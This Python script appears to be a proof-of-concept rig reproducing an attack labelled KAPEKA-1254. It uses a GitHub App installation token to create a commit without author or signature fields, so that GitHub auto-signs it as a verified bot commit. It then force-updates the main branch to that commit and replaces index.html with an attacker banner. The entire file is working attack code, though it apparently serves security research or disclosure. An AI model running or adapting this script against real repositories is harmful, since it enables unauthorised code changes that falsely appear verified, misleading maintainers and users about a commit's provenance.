#!/usr/bin/env python3
"""Create a commit using ONLY the GitHub App installation token (ghs_) that the
Actions runner is handed. No author/committer/signature fields are sent, which
is the condition under which GitHub auto-signs a bot commit.

This mirrors the KAPEKA-1254 attacker, who lifts an equivalent installation
token out of an anonymous v0 sandbox.
"""
import json
import os
import urllib.request

TOK = os.environ["TOK"]
API = "https://api.github.com/repos/" + os.environ["GITHUB_REPOSITORY"]


def call(path, body=None, method=None):
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(
        API + path, data=data, method=method or ("POST" if body else "GET"),
        headers={"authorization": "token " + TOK,
                 "accept": "application/vnd.github+json",
                 "content-type": "application/json",
                 "user-agent": "rig"})
    with urllib.request.urlopen(req) as r:
        return json.load(r)


base = call("/git/ref/heads/main")["object"]["sha"]
tree = call("/git/commits/" + base)["tree"]["sha"]
blob = call("/git/blobs", {"content": "<h1>ATTACKER-VIA-INSTALLATION-TOKEN</h1>",
                           "encoding": "utf-8"})["sha"]
newtree = call("/git/trees", {"base_tree": tree, "tree": [
    {"path": "index.html", "mode": "100644", "type": "blob", "sha": blob}]})["sha"]

# NO author, NO committer, NO signature -> GitHub signs it as a bot
commit = call("/git/commits", {"message": "ATTACK commit created with installation token",
                               "tree": newtree, "parents": [base]})
sha = commit["sha"]
print("new commit:", sha)

call("/git/refs/heads/main", {"sha": sha}, method="PATCH")
print("ref updated to", sha)

v = call("/commits/" + sha)["commit"]["verification"]
print("VERIFICATION:", json.dumps(v))
